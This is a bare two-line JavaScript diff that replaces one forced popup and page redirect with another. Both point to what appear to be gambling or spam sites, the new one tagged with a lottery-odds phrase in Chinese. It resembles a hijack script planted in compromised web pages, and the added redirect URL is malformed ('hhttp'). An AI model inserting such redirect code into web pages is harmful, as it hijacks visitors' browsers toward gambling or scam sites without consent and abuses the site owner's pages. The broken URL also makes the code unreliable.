@@ -1,2 +1,2 @@
- window.open ("http://123.bmw999.pw/#388"); 
- window.location.href="http://123.bmw999.pw/#388"; 
+window.open ("http://www.xrz088.com/#（特码49倍）");
+window.location.href="hhttp://www.xrz088.com/#（特码49倍）";
